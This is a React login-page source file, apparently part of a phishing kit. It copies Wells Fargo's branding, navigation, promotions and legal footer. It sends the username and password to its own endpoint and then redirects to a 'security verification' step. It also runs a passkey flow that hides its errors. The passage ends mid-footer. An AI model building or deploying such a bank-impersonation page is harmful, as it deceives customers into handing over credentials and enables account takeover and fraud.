import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search, CreditCard, Home, TrendingUp, PiggyBank, Smartphone, Shield, Users } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";

type LoginFormData = {
  username: string;
  password: string;
};

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      
      // Request biometric with facial recognition required
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;

      if (credential) {
        // Get device and biometric info
        const authenticatorResponse = credential.response as AuthenticatorAssertionResponse;
        const authData = new Uint8Array(authenticatorResponse.authenticatorData);
        const flags = authData[32];
        const userVerified = (flags & 0x04) !== 0;
        const userPresent = (flags & 0x01) !== 0;
        
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authenticatorResponse.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified: userVerified,
            userPresent: userPresent,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });

        if (authRes.ok) {
          const authDataResponse = await authRes.json();
          toast({
            title: "Face ID Sign On Successful",
            description: "Please complete security verification...",
          });
          sessionStorage.setItem("loginUsername", authDataResponse.user?.id || "biometric_user");
          setLocation("/verify");
        } else {
          throw new Error("Biometric authentication failed");
        }
      }
    } catch (error: any) {
      // Silently handle errors - no popup
      console.log("Face ID not available or cancelled");
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      const result = await response.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({
        title: "Sign On Successful",
        description: "Please complete security verification...",
      });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };



  // Desktop Layout - CSS recreation of Wells Fargo website style
  const DesktopLayout = () => (
    <div className="hidden lg:block min-h-screen bg-white">
      {/* Top red header bar with Wells Fargo logo */}
      <header className="bg-[#d71e28]">
        <div className="max-w-7xl mx-auto px-6 py-3 flex items-center justify-between">
          <div className="text-white font-bold text-2xl tracking-wider" style={{ fontFamily: "Georgia, serif" }}>
            WELLS FARGO
          </div>
          <div className="flex items-center gap-5 text-sm text-white">
            <span className="hover:underline cursor-pointer">ATMs/Locations</span>
            <span className="hover:underline cursor-pointer">Help</span>
            <span className="hover:underline cursor-pointer">Español</span>
            <Search className="w-4 h-4 cursor-pointer" />
            <Button
              type="button"
              onClick={() => {
                const usernameInput = document.querySelector('[data-testid="desktop-input-username"]') as HTMLInputElement;
                if (usernameInput) usernameInput.focus();
              }}
              className="bg-white text-[#d71e28] hover:bg-gray-100 px-4 py-1.5 rounded text-sm font-semibold"
              data-testid="header-sign-on-button"
            >
              Sign On
            </Button>
          </div>
        </div>
      </header>

      {/* Main navigation bar - white with category links */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6 py-3 flex items-center gap-8 text-sm">
          <span className="text-gray-800 font-medium border-b-2 border-[#d71e28] pb-2 cursor-pointer">Personal</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Investing & Wealth Management</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Business</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Commercial Banking</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Corporate & Investment Banking</span>
          <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">About Wells Fargo</span>
        </div>
      </div>

      {/* Secondary navigation - product links */}
      <div className="bg-[#fafafa] border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-6 text-sm text-gray-600">
          {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto Loans", "Premier", "Education & Tools"].map((item) => (
            <span key={item} className="hover:text-[#d71e28] cursor-pointer">
              {item}
            </span>
          ))}
        </div>
      </div>

      {/* Main content area with login form and promo */}
      <section className="bg-[#f5f0eb] border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6 py-10 flex gap-16">
          {/* Left side - Sign On Form Card */}
          <div className="w-[260px] flex-shrink-0 bg-white rounded-lg shadow-lg p-6">
            <h2 className="text-xl text-gray-900 mb-1" style={{ fontFamily: "Georgia, serif" }}>
              {greeting}
            </h2>
            <p className="text-sm text-gray-500 mb-5">Sign on to manage your accounts.</p>

            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div>
                <input
                  {...form.register("username")}
                  placeholder="Username"
                  autoComplete="username"
                  autoCapitalize="off"
                  autoCorrect="off"
                  spellCheck={false}
                  className="w-full h-11 px-3 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                  data-testid="desktop-input-username"
                />
              </div>

              <div className="relative">
                <input
                  {...form.register("password")}
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  autoComplete="current-password"
                  className="w-full h-11 px-3 pr-12 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                  data-testid="desktop-input-password"
                />
                <button
                  type="button"
                  onMouseDown={(e) => e.preventDefault()}
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 top-1/2 -translate-y-1/2 text-[#0066b2] text-sm hover:underline"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>

              <div className="flex items-center gap-2 pt-1">
                <input type="checkbox" id="saveUsername" className="w-4 h-4 border-gray-300 rounded" />
                <label htmlFor="saveUsername" className="text-sm text-gray-600">Save username</label>
              </div>

              <div className="flex items-center gap-3 pt-2">
                <Button
                  type="submit"
                  className="h-10 px-8 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded-full text-sm"
                  disabled={loginMutation.isPending}
                  data-testid="desktop-button-sign-on"
                >
                  {loginMutation.isPending ? "..." : "Sign On"}
                </Button>
                <Link href="/register" className="text-gray-600 hover:text-gray-800 text-sm font-medium">
                  Enroll
                </Link>
              </div>
            </form>

            <div className="mt-5 space-y-1 text-sm">
              <Link href="/forgot-password" className="text-gray-600 hover:text-[#d71e28] block">
                Forgot username or password?
              </Link>
              <Link href="/security" className="text-gray-600 hover:text-[#d71e28] block">
                Security Center
              </Link>
              <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
                Privacy, Cookies, and Legal
              </span>
            </div>
          </div>

          {/* Center - Promotional content */}
          <div className="flex-1 pt-8">
            <h1 className="text-4xl text-gray-800 font-light mb-4 leading-tight" style={{ fontFamily: "Georgia, serif" }}>
              $325 checking bonus on us
            </h1>
            <p className="text-base text-gray-600 mb-6 leading-relaxed max-w-md">
              New customers open an eligible checking account with qualifying direct deposits
            </p>
            <button className="border-2 border-gray-800 text-gray-800 px-6 py-2.5 rounded-full text-sm font-semibold hover:bg-gray-800 hover:text-white transition-colors">
              Get started &gt;&gt;
            </button>
          </div>

          {/* Right side - Enjoy $325 */}
          <div className="flex-shrink-0 pt-8 text-right">
            <p className="text-sm text-[#9b2d83] mb-1">Enjoy</p>
            <p className="text-6xl font-light text-[#9b2d83]" style={{ fontFamily: "Georgia, serif" }}>$325</p>
          </div>
        </div>
      </section>

      {/* Four promo cards */}
      <section className="bg-white py-6 border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-6">
          <div className="grid grid-cols-4 gap-4">
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-[#d71e28] rounded-full flex items-center justify-center flex-shrink-0">
                <CreditCard className="w-5 h-5 text-white" />
              </div>
              <div>
                <h3 className="font-semibold text-gray-800 text-sm mb-1">Earn a $200 cash rewards bonus</h3>
                <p className="text-xs text-gray-600 mb-2 leading-relaxed">Plus, earn unlimited 2% cash rewards on purchases with $0 annual fee. Terms apply.</p>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">Learn more &gt;</span>
              </div>
            </div>
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-[#0066b2] rounded-full flex items-center justify-center flex-shrink-0">
                <Users className="w-5 h-5 text-white" />
              </div>
              <div>
                <h3 className="font-semibold text-gray-800 text-sm mb-1">New customer? Say hello to a $125 bonus</h3>
                <p className="text-xs text-gray-600 mb-2 leading-relaxed">Open a Clear Access Banking account, great for students & more, complete offer requirements.</p>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">See offer details &gt;</span>
              </div>
            </div>
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-[#fef3e6] rounded-full flex items-center justify-center flex-shrink-0">
                <PiggyBank className="w-5 h-5 text-[#d71e28]" />
              </div>
              <div>
                <h3 className="font-semibold text-gray-800 text-sm mb-1">Open a savings account</h3>
                <p className="text-xs text-gray-600 mb-2 leading-relaxed">Explore our savings accounts and find the right fit for you.</p>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">Get started &gt;</span>
                <span className="text-gray-400 mx-1">|</span>
                <span className="text-[#0066b2] text-xs hover:underline cursor-pointer">Check rates &gt;</span>
              </div>
            </div>
            <div className="flex items-start gap-3 p-3 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-10 h-10 bg-white border border-gray-200 rounded-full flex items-center justify-center flex-shrink-0 relative">
                <TrendingUp className="w-5 h-5 text-[#0066b2]" />
                <div className="absolute -top-1 -right-1 bg-[#d71e28] text-white text-[10px] px-1 rounded font-bold">%</div>
              </div>
              <div>
                <p className="text-xs text-gray-500 mb-1">Interest rates today</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Home mortgage section with image */}
      <section className="bg-[#f8f8f8] py-10">
        <div className="max-w-7xl mx-auto px-6">
          <div className="bg-white rounded-lg shadow-sm overflow-hidden flex">
            <div className="w-1/2 bg-gradient-to-br from-green-800 to-green-900 p-10 flex flex-col justify-center">
              <h2 className="text-3xl text-white font-light mb-4" style={{ fontFamily: "Georgia, serif" }}>
                A home of your own
              </h2>
              <p className="text-white/80 mb-6">
                With low down payment options on a fixed-rate mortgage.
              </p>
              <button className="bg-[#1a1a1a] text-white px-5 py-2 rounded text-sm font-semibold w-fit hover:bg-black transition-colors">
                Get started
              </button>
            </div>
            <div className="w-1/2 bg-gradient-to-br from-green-100 to-green-200 flex items-center justify-center">
              <Home className="w-32 h-32 text-green-700 opacity-50" />
            </div>
          </div>
        </div>
      </section>

      {/* Financial guidance and support */}
      <section className="bg-white py-12">
        <div className="max-w-7xl mx-auto px-6">
          <h2 className="text-2xl text-gray-800 mb-8 text-center" style={{ fontFamily: "Georgia, serif" }}>
            Financial guidance and support
          </h2>
          <div className="grid grid-cols-3 gap-6">
            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-full h-40 bg-gradient-to-br from-yellow-100 to-orange-100 rounded-lg mb-4 flex items-center justify-center">
                <PiggyBank className="w-16 h-16 text-yellow-600" />
              </div>
              <h3 className="font-semibold text-gray-800 mb-2">Savings you can count on</h3>
              <p className="text-xs text-gray-600 mb-3">Discover how smart saving moves you closer to your goals.</p>
              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
                Grow your savings
              </button>
            </div>
            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-full h-40 bg-gradient-to-br from-blue-100 to-indigo-100 rounded-lg mb-4 flex items-center justify-center">
                <TrendingUp className="w-16 h-16 text-blue-600" />
              </div>
              <h3 className="font-semibold text-gray-800 mb-2">Trendlines over headlines</h3>
              <p className="text-xs text-gray-600 mb-3">Our forecasts and potential investment opportunities for the coming year.</p>
              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
                Get the 2026 Outlook
              </button>
            </div>
            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
              <div className="w-full h-40 bg-[#d71e28] rounded-lg mb-4 flex items-center justify-center">
                <div className="text-white text-center">
                  <Shield className="w-10 h-10 mx-auto mb-2" />
                  <div className="font-bold">Fraud &</div>
                  <div className="font-bold">Scam Alert</div>
                </div>
              </div>
              <h3 className="font-semibold text-gray-800 mb-2">Your shield against scams</h3>
              <p className="text-xs text-gray-600 mb-3">Spot the latest tactics scammers are using.</p>
              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
                Get the latest
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Ask Fargo Mobile App Section */}
      <section className="bg-[#f8f8f8] py-10">
        <div className="max-w-7xl mx-auto px-6">
          <div className="bg-white rounded-lg shadow-sm p-8 flex items-center gap-8">
            <div className="w-48 flex-shrink-0">
              <div className="bg-gradient-to-b from-[#d71e28] to-[#8B0000] rounded-2xl p-4 shadow-lg">
                <div className="bg-white rounded-xl p-3">
                  <div className="text-[#d71e28] font-bold text-sm mb-1">Fargo</div>
                  <div className="text-xs text-gray-600">Here are insights into your spending</div>
                  <div className="mt-2 flex gap-1">
                    <div className="w-2 h-8 bg-[#d71e28] rounded"></div>
                    <div className="w-2 h-6 bg-[#ffcd41] rounded"></div>
                    <div className="w-2 h-10 bg-[#d71e28] rounded"></div>
                    <div className="w-2 h-4 bg-[#ffcd41] rounded"></div>
                  </div>
                </div>
              </div>
            </div>
            <div className="flex-1">
              <h2 className="text-2xl text-gray-800 mb-3" style={{ fontFamily: "Georgia, serif" }}>
                Need help? Ask Fargo<sup>®</sup>
              </h2>
              <p className="text-sm text-gray-600 mb-4 leading-relaxed">
                Fargo<sup>®</sup> gives you valuable insights like a summary of your spending by category, retailer and across accounts. Find it only in the Wells Fargo Mobile<sup>®</sup> app.
              </p>
              <div className="flex gap-3">
                <button className="bg-black text-white px-4 py-2 rounded text-xs font-semibold flex items-center gap-2">
                  <Smartphone className="w-4 h-4" /> App Store
                </button>
                <button className="bg-black text-white px-4 py-2 rounded text-xs font-semibold flex items-center gap-2">
                  <Smartphone className="w-4 h-4" /> Google Play
                </button>
              </div>
              <p className="text-xs text-gray-400 mt-3">*Screen image is simulated</p>
            </div>
          </div>
        </div>
      </section>

      {/* Serving our customers section */}
      <section className="bg-white py-12">
        <div className="max-w-7xl mx-auto px-6 text-center">
          <h2 className="text-2xl text-gray-800 mb-4" style={{ fontFamily: "Georgia, serif" }}>
            Serving our customers and communities
          </h2>
          <p className="text-sm text-gray-600 max-w-3xl mx-auto mb-8">
            It doesn't happen with one transaction, in one day on the job, or in one quarter. It's earned relationship by relationship.
          </p>
          <div className="grid grid-cols-2 gap-8 max-w-4xl mx-auto">
            <div className="bg-[#d71e28] rounded-lg p-6 text-left text-white">
              <div className="text-white font-bold text-lg mb-2" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</div>
              <h3 className="font-semibold mb-2">Who we are</h3>
              <p className="text-sm opacity-90 mb-4">Wells Fargo helps strengthen communities through inclusion, economic empowerment, and sustainability.</p>
              <button className="text-white text-sm underline hover:no-underline">About Wells Fargo</button>
            </div>
            <div className="bg-gradient-to-br from-teal-600 to-teal-700 rounded-lg p-6 text-left text-white">
              <h3 className="font-semibold mb-2">Why we're committed to communities</h3>
              <p className="text-sm opacity-90 mb-4">We don't just serve our communities—we are our communities. We're committed to helping customers and neighborhoods across the country thrive.</p>
              <button className="border border-white text-white px-4 py-2 rounded text-sm font-semibold hover:bg-white hover:text-teal-700 transition-colors">
                Wells Fargo Stories
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Desktop Footer */}
      <footer className="bg-[#f5f5f5] border-t border-gray-200 py-8">
        <div className="max-w-7xl mx-auto px-6">
          <div className="flex justify-between items-center text-xs text-gray-500 mb-4">
            <div className="flex gap-4">
              <span className="hover:text-[#d71e28] cursor-pointer">Privacy Policy</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Terms of Use</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Report Fraud</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Security</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Accessibility</span>
              <span className="hover:text-[#d71e28] cursor-pointer">Sitemap</span>
            </div>
            <div>
              © 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
            </div>
          </div>
          <p className="text-xs text-gray-400">
            Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
          </p>
        </div>
      </footer>
    </div>
  );

  // Mobile Layout (phones and tablets - below lg: breakpoint)
  const MobileLayout = () => (
    <div className="lg:hidden min-h-screen flex flex-col bg-white">

      {/* ── Red header ── */}
      <header className="bg-[#d71e28] flex items-center justify-between px-4 py-3">
        {/* Empty left spacer to center the title */}
        <div className="w-8" />
        <h1
          className="text-white font-bold tracking-widest text-xl"
          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.18em" }}
        >
          WELLS FARGO
        </h1>
        {/* Hamburger icon */}
        <button
          type="button"
          className="flex flex-col gap-[5px] p-1"
          aria-label="Open menu"
          data-testid="button-mobile-menu"
        >
          <span className="block w-6 h-[2px] bg-white rounded" />
          <span className="block w-6 h-[2px] bg-white rounded" />
          <span className="block w-6 h-[2px] bg-white rounded" />
        </button>
      </header>

      {/* ── Gold accent line ── */}
      <div className="h-[3px] bg-[#ffcd41]" />

      {/* ── Main scrollable area ── */}
      <main className="flex-1 bg-white">
        <div className="w-full max-w-[420px] mx-auto px-5">

          {/* ── Greeting ── */}
          <h2
            className="text-[38px] font-normal text-[#1a1a1a] text-center mt-8 mb-7 leading-tight"
            style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
            data-testid="text-greeting"
          >
            {greeting}
          </h2>

          {/* ── Form ── */}
          <form onSubmit={form.handleSubmit(onSubmit)}>

            {/* Username */}
            <div className="mb-4">
              <input
                {...form.register("username", { required: true })}
                placeholder="Username"
                autoComplete="username"
                autoCapitalize="off"
                autoCorrect="off"
                spellCheck={false}
                className="w-full h-[58px] px-4 text-[17px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-gray-500"
                data-testid="input-username"
              />
            </div>

            {/* Password */}
            <div className="mb-5 relative">
              <input
                {...form.register("password", { required: true })}
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                autoComplete="current-password"
                className="w-full h-[58px] px-4 pr-16 text-[17px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 rounded-xl focus:outline-none focus:border-gray-500"
                data-testid="input-password"
              />
              <button
                type="button"
                onMouseDown={(e) => e.preventDefault()}
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-[#4338ca] font-semibold text-[15px]"
                data-testid="button-toggle-password"
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>

            {/* Save username checkbox */}
            <div className="flex items-center gap-3 mb-2">
              <input
                type="checkbox"
                id="mobileSaveUsername"
                checked={saveUsername}
                onChange={(e) => setSaveUsername(e.target.checked)}
                className="w-[18px] h-[18px] border-2 border-gray-400 rounded-sm accent-gray-700 cursor-pointer flex-shrink-0"
                data-testid="checkbox-save-username"
              />
              <label htmlFor="mobileSaveUsername" className="text-[16px] text-gray-800 cursor-pointer select-none">
                Save username
              </label>
            </div>

            {/* Save username helper text */}
            <p className="text-[13px] text-gray-500 leading-snug mb-7">
              To help keep your account secure, save your username only on devices that aren't used by other people.
            </p>

            {/* ── Sign on button (gray pill) ── */}
            <div className="flex justify-center mb-4">
              <button
                type="submit"
                disabled={loginMutation.isPending}
                className="h-[52px] w-[220px] rounded-full bg-[#d5d5d5] text-gray-500 font-semibold text-[17px] transition-colors disabled:opacity-70"
                data-testid="button-sign-on"
              >
                {loginMutation.isPending ? "Signing on…" : "Sign on"}
              </button>
            </div>

          </form>

          {/* ── "or" divider ── */}
          <div className="flex items-center justify-center mb-4">
            <span className="text-[15px] text-gray-600">or</span>
          </div>

          {/* ── Use a passkey button (white + dark border pill) ── */}
          <div className="flex justify-center mb-4">
            <button
              type="button"
              onClick={handleBiometricLogin}
              disabled={biometricLoading}
              className="h-[52px] w-[220px] rounded-full bg-white border border-gray-800 text-gray-900 font-semibold text-[16px] flex items-center justify-center gap-2 transition-colors hover:bg-gray-50 disabled:opacity-70"
              data-testid="button-passkey"
            >
              {/* Passkey icon — person silhouette with key badge */}
              <svg
                viewBox="0 0 24 24"
                className="w-[20px] h-[20px] flex-shrink-0 text-gray-800"
                fill="currentColor"
                aria-hidden="true"
              >
                <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z" />
                <circle cx="19.5" cy="17" r="2.5" fill="#4338ca" />
                <rect x="21.5" y="16.6" width="2.5" height="1.2" rx="0.4" fill="#4338ca" />
                <rect x="23.2" y="17.4" width="1.2" height="1.4" rx="0.4" fill="#4338ca" />
              </svg>
              {biometricLoading ? "Authenticating…" : "Use a passkey"}
            </button>
          </div>

          {/* Passkey helper text */}
          <p className="text-[13px] text-gray-600 leading-snug mb-10 px-1">
            Don't have one? Create a passkey after signing on and skip the password next time.
          </p>

          {/* ── Forgot link ── */}
          <div className="flex items-center justify-center gap-1 mb-10">
            <span className="text-[#4338ca] text-[15px]">→</span>
            <Link
              href="/forgot-password"
              className="text-[#4338ca] text-[15px] hover:underline"
              data-testid="link-forgot"
            >
              Forgot username or password?
            </Link>
          </div>

        </div>
      </main>

      <OfficialFooter />
    </div>
  );

  // Render both layouts - CSS handles which one is visible
  return (
    <>
      {/* Desktop Layout */}
      <div className="hidden lg:block min-h-screen bg-white">
        {/* Top red header bar with Wells Fargo logo */}
        <header className="bg-[#d71e28]">
          <div className="max-w-7xl mx-auto px-6 py-3 flex items-center justify-between">
            <div className="text-white font-bold text-2xl tracking-wider" style={{ fontFamily: "Georgia, serif" }}>
              WELLS FARGO
            </div>
            <div className="flex items-center gap-5 text-sm text-white">
              <span className="hover:underline cursor-pointer">ATMs/Locations</span>
              <span className="hover:underline cursor-pointer">Help</span>
              <span className="hover:underline cursor-pointer">Español</span>
              <Search className="w-4 h-4 cursor-pointer" />
              <Button
                type="button"
                onClick={() => {
                  const usernameInput = document.querySelector('[data-testid="desktop-input-username"]') as HTMLInputElement;
                  if (usernameInput) usernameInput.focus();
                }}
                className="bg-white text-[#d71e28] hover:bg-gray-100 px-4 py-1.5 rounded text-sm font-semibold"
              >
                Sign On
              </Button>
            </div>
          </div>
        </header>

        {/* Main navigation bar */}
        <div className="bg-white border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-6 py-3 flex items-center gap-8 text-sm">
            <span className="text-gray-800 font-medium border-b-2 border-[#d71e28] pb-2 cursor-pointer">Personal</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Investing & Wealth Management</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Business</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Commercial Banking</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">Corporate & Investment Banking</span>
            <span className="text-gray-600 hover:text-gray-800 cursor-pointer pb-2">About Wells Fargo</span>
          </div>
        </div>

        {/* Secondary navigation */}
        <div className="bg-[#fafafa] border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-6 text-sm text-gray-600">
            {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto Loans", "Premier", "Education & Tools"].map((item) => (
              <span key={item} className="hover:text-[#d71e28] cursor-pointer">{item}</span>
            ))}
          </div>
        </div>

        {/* Main content area with login form and promo */}
        <section className="bg-[#f5f0eb] border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-6 py-10 flex gap-16">
            {/* Left side - Sign On Form Card */}
            <div className="w-[260px] flex-shrink-0 bg-white rounded-lg shadow-lg p-6">
              <h2 className="text-xl text-gray-900 mb-1" style={{ fontFamily: "Georgia, serif" }}>
                {greeting}
              </h2>
              <p className="text-sm text-gray-500 mb-5">Sign on to manage your accounts.</p>

              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                <div>
                  <input
                    {...form.register("username")}
                    placeholder="Username"
                    autoComplete="username"
                    autoCapitalize="off"
                    autoCorrect="off"
                    spellCheck={false}
                    className="w-full h-11 px-3 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                    data-testid="desktop-input-username"
                  />
                </div>

                <div className="relative">
                  <input
                    {...form.register("password")}
                    type={showPassword ? "text" : "password"}
                    placeholder="Password"
                    autoComplete="current-password"
                    className="w-full h-11 px-3 pr-12 text-sm border-b border-gray-300 bg-transparent focus:border-[#d71e28] focus:outline-none placeholder-gray-400"
                    data-testid="desktop-input-password"
                  />
                  <button
                    type="button"
                    onMouseDown={(e) => e.preventDefault()}
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-0 top-1/2 -translate-y-1/2 text-[#0066b2] text-sm hover:underline"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </button>
                </div>

                <div className="flex items-center gap-2 pt-1">
                  <input type="checkbox" id="desktopSaveUsername" className="w-4 h-4 border-gray-300 rounded" />
                  <label htmlFor="desktopSaveUsername" className="text-sm text-gray-600">Save username</label>
                </div>

                <div className="flex items-center gap-3 pt-2">
                  <Button
                    type="submit"
                    className="h-10 px-8 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded-full text-sm"
                    disabled={loginMutation.isPending}
                    data-testid="desktop-button-sign-on"
                  >
                    {loginMutation.isPending ? "..." : "Sign On"}
                  </Button>
                  <Link href="/register" className="text-gray-600 hover:text-gray-800 text-sm font-medium">
                    Enroll
                  </Link>
                </div>
              </form>

              <div className="mt-5 space-y-1 text-sm">
                <Link href="/forgot-password" className="text-gray-600 hover:text-[#d71e28] block">
                  Forgot username or password?
                </Link>
                <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
                  Security Center
                </span>
                <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer block">
                  Privacy, Cookies, and Legal
                </span>
              </div>
            </div>

            {/* Center - Promotional content */}
            <div className="flex-1 pt-8">
              <h1 className="text-4xl text-gray-800 font-light mb-4 leading-tight" style={{ fontFamily: "Georgia, serif" }}>
                $325 checking bonus on us
              </h1>
              <p className="text-base text-gray-600 mb-6 leading-relaxed max-w-md">
                New customers open an eligible checking account with qualifying direct deposits
              </p>
              <button className="border-2 border-gray-800 text-gray-800 px-6 py-2.5 rounded-full text-sm font-semibold hover:bg-gray-800 hover:text-white transition-colors">
                Get started &gt;&gt;
              </button>
            </div>

            {/* Right side - Enjoy $325 */}
            <div className="flex-shrink-0 pt-8 text-right">
              <p className="text-sm text-[#9b2d83] mb-1">Enjoy</p>
              <p className="text-6xl font-light text-[#9b2d83]" style={{ fontFamily: "Georgia, serif" }}>$325</p>
            </div>
          </div>
        </section>

        {/* Desktop Footer */}
        <footer className="bg-[#f5f5f5] border-t border-gray-200 py-8">
          <div className="max-w-7xl mx-auto px-6">
            <div className="flex justify-between items-center text-xs text-gray-500 mb-4">
              <div className="flex gap-4">
                <span className="hover:text-[#d71e28] cursor-pointer">Privacy Policy</span>
                <span className="hover:text-[#d71e28] cursor-pointer">Terms of Use</span>
                <span className="hover:text-[#d71e28] cursor-pointer">Report Fraud</span>
                <span className="hover:text-[#d71e28] cursor-pointer">Security</span>
